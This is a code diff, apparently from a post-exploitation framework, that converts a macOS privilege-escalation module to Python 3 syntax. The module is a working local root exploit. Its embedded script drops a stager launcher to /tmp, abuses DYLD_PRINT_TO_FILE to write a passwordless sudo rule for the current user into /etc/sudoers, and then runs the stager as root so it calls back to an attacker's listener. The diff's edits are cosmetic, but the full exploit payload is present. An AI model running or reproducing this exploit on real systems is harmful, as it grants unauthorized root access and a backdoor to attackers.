@@ -1,8 +1,10 @@
+from __future__ import print_function
+from builtins import object
 from lib.common import helpers
 
 
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
         # metadata info about the module, not modified during runtime
@@ -33,13 +35,13 @@ class Module:
             # the minimum language version needed
             'MinLanguageVersion' : '2.6',
 
-	    'NeedsAdmin' : False,
+            'NeedsAdmin' : False,
 
             # list of any references/other comments
             'Comments': [
                 'References:',
                 'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/osx/local/dyld_print_to_file_root.rb',
-				'http://www.sektioneins.com/en/blog/15-07-07-dyld_print_to_file_lpe.html'
+                'http://www.sektioneins.com/en/blog/15-07-07-dyld_print_to_file_lpe.html'
             ]
         }
 
@@ -52,13 +54,13 @@ class Module:
                 'Description'   :   'Agent used to Privesc from',
                 'Required'      :   True,
                 'Value'         :   ''
-       		},
+               },
             'FileName': {
             # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'The filename to use when the temporary file is dropped to disk.',
                 'Required'      :   True,
                 'Value'         :   'error.log'
-       		},
+               },
             'Listener' : {
                 'Description'   :   'Listener to use.',
                 'Required'      :   True,
@@ -68,22 +70,22 @@ class Module:
                 'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
-       		},
+               },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-      		},
+              },
             'WriteablePath' : {
                 'Description'   :   'Full path to where the file should be written. Defaults to /tmp/.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/'
-      		}
-   	    }
+              }
+           }
 
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.	
-	self.mainMenu = mainMenu
+        self.mainMenu = mainMenu
         # During instantiation, any settable option parameters
         #   are passed as an object set to the module and the
         #   options dictionary is automatically set. This is mostly
@@ -103,15 +105,15 @@ class Module:
         #
         # the script should be stripped of comments, with a link to any
         #   original reference script included in the comments.
-	listenername = self.options['Listener']['Value']
-	userAgent = self.options['UserAgent']['Value']
-	safeChecks = self.options['SafeChecks']['Value']
+        listenername = self.options['Listener']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        safeChecks = self.options['SafeChecks']['Value']
 
         launcher = self.mainMenu.stagers.generate_launcher(listenername, language='python', userAgent=userAgent, safeChecks=safeChecks)
-	if launcher == "":
-		print helpers.color("[!] Error in launcher generation")
-	launcher = launcher.replace("\"","\\\"")
-	fullPath = self.options['WriteablePath']['Value'] + self.options['FileName']['Value']
+        if launcher == "":
+            print(helpers.color("[!] Error in launcher generation"))
+        launcher = launcher.replace("\"","\\\"")
+        fullPath = self.options['WriteablePath']['Value'] + self.options['FileName']['Value']
         fileName = self.options['FileName']['Value']
         script = """
 import os
@@ -121,11 +123,11 @@ file.write("{filecontents}")
 file.close()
 print "Attempting to execute stager as root..."
 try:
-	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
-	print "Successfully ran command, you should be getting an elevated stager"
+    os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
+    print "Successfully ran command, you should be getting an elevated stager"
 except:
-	print "[!] Could not execute payload!"
+    print "[!] Could not execute payload!"
             
-	""" .format(fullpath=fullPath,filecontents=launcher, filename=fileName)
+    """ .format(fullpath=fullPath,filecontents=launcher, filename=fileName)
 
         return script
